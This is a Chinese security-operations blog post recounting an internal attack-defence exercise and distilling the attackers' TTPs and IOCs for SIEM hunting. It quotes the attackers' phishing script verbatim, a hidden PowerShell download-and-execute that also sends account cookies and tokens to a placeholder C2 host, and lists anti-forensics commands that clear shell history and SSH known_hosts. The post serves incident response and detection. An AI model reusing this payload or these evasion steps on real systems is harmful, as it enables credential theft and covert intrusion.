---
layout: post
title:  "简要分析一次真实对抗中的TTPs和IOCs"
date:   2022-01-23 10:28:28 +0800
categories: 安全运营
tags: 应急响应 攻防实战
---

最近在内部进行一场为期两周的攻防演练。这次对抗中，观察到蓝军的一些攻击手法，尝试学着ATT&CK描述APT组织的方式提取蓝队的技战术，更有效的检测和回溯攻击行为。

*本文写的比较随意，没有什么技术含量，仅做一个简单的记录，部分信息比较敏感打了重码，各位将就看。*

### 背景

演练开始后不久，蓝队已经成功攻击分支结构内网，由于该分支结构不是总部维护的IT系统，各安全策略与监控手段都存在不同程度缺失。经判断分支机构的内部网络已经完全沦陷，攻击队的驻点非常多。但因为保证业务正常，又不能完全断开该分支机构访问总部网络，因此只能进行艰苦的“阻击战”，防止攻击队对总部网络进一步攻击。

### 初战

![Snipaste_2022-01-21_14-47-10](https://raw.githubusercontent.com/chiww/chiww.github.io/master/assets/A-Simple-TTPs-IOCs/Snipaste_2022-01-21_14-47-10.png)

在分支机构沦陷后，蓝军对总部网络发起进攻。首先通过SSH爆破，拿到了边界主机shell后，进入总部内网，在内网中进行探测扫扫描、驻留活动。

由于爆破获得一定主机数量，蓝军在各机器基本执行相同的动作：首先使用`export HISTSIZE=0`关闭history记录，下载扫描器或者后门，执行扫描器或后门，确认进程正常启动后删除下载文件。另外，还会修改文件名，达到混淆藏匿目的。

![Snipaste_2022-01-21_15-17-02](https://raw.githubusercontent.com/chiww/chiww.github.io/master/assets/A-Simple-TTPs-IOCs/Snipaste_2022-01-21_15-17-02.png)

蓝军的动作非常快，内部机器沦陷了一部分。



### 再战

另一支蓝军走另外一条路，从办公终端入手，找到内部IM的0day漏洞，对全网下发了钓鱼脚本，脚本大致长这个样子的：

```
(()=>{r=require;r('child_process').exec('powershell -win hidden "IE`x(new-object net.webclient).downloadstring(\'http://<公网恶意执行PS文件URL>\')"');wf=window.fslinker;a=window.cookies.ACCOUNT;t=window.cookies.ACCTOKEN;dd=wf.getDeviceId();h=new XMLHttpRequest();u="http://<C2地址>/?a="+a+"\&t="+t+"\&d="+dd;h.open("GET", u);h.send();})();
```

该钓鱼攻击面广，基本全网都收到了，沦陷终端数量不断在增长，又因为后门程序是做过免杀的，终端杀软没有动静；最后靠的在终端EDR上做了powershell行为规则，发现`downloadstring`命令即告警，才有幸及时发现，并通知到用户处置。



### 技战术

#### TTPs

如果仅从蓝军执行日志来看，可以大致总结分析下蓝军的TTPs，例如可以有如下几点：

1. 使用`export HISTSIZE=0`命令关闭日志记录功能
2. 使用某个账号对C段主机进行ssh喷洒
3. 使用`rm ~/.ssh/known_hosts`命令删除登录历史 
4. 从C2下载内网扫描和后门程序，执行成功后删除原始文件
5. 在办公侧使用powershell中`net.webclient`实现无文件攻击  
6. 使用`ip.sb`试探主机是否出网

TTPs是攻击者的行为习惯，这个是很难去改变的。例如蓝军每获取一个主机资源会使用`HISTSIZE=0`机制关闭history日志记录功能、使用删除`known_hosts`方式删除SSH登录历史。这些行为习惯是贯穿在整个攻击过程中，可以根据这些行为特征来制定针对性规则。

#### IOCs

同时TTPs中也提供了一下IOC，例如`HISTSIZE=0`、`ip.sb`，可以SIEM中去回溯整个攻击行为。回溯过程是要仅可能还原蓝军攻击路径，要将蓝军攻击的一个点，扩展成一条线或者一个面，同时，也是为了防止因为单个检测设备检测缺失导致的检测遗漏。 

例如，可以从以下方式入手：

- 从`export HISTSIZE=0`检索
- 从C段SSH登录失败检索
- `ip.sb`中检索

根据这些IOC在SIEM中反查：

![](https://raw.githubusercontent.com/chiww/chiww.github.io/master/assets/A-Simple-TTPs-IOCs/Snipaste_2022-01-21_11-41-31-1642908102135.png)

根据`HITSIZE=0`反查的结果



![](https://raw.githubusercontent.com/chiww/chiww.github.io/master/assets/A-Simple-TTPs-IOCs/Snipaste_2022-01-21_11-49-46.png)

根据`ip.sb`反查的结果



![](https://raw.githubusercontent.com/chiww/chiww.github.io/master/assets/A-Simple-TTPs-IOCs/Snipaste_2022-01-21_13-49-08.png)

根据登录失败记录反查的结果



依据SIEM查到的一些结果，就可以大致可以梳理出整个攻击路径：

![Snipaste_2022-01-21_17-27-10](https://raw.githubusercontent.com/chiww/chiww.github.io/master/assets/A-Simple-TTPs-IOCs/Snipaste_2022-01-21_17-27-10.png)

当然这个路径可能只是攻击队的其中一条路径，这取决于SIEM中收录的日志丰富程度和日志信息的颗粒度。



### 后记

这篇文章没有什么技术含量，仅作为一个简单的记录，尝试去描述一个攻击行为的TTPs和IOCs，以及TTP和IOC在攻击回溯中的一些用法。

是否能够完整回溯整个攻击路径，关键还是靠以下几个方面：

1. 日志收录的覆盖度；尤其是主机类的日志，一旦有一个节点日志是缺失的，就有可能丢失一大片的攻击信息；
2. 日志收录的颗粒度；在攻防对抗中，攻击队一定会想法设法绕过安全检测设备，这种针对性的攻击仅仅依靠安全设备这种HASH特征的检测方式是不能够完全检测出来的。这时候需要更详细的原始信息，这个原始信息包括网络流量、主机命令执行、进程创建等。













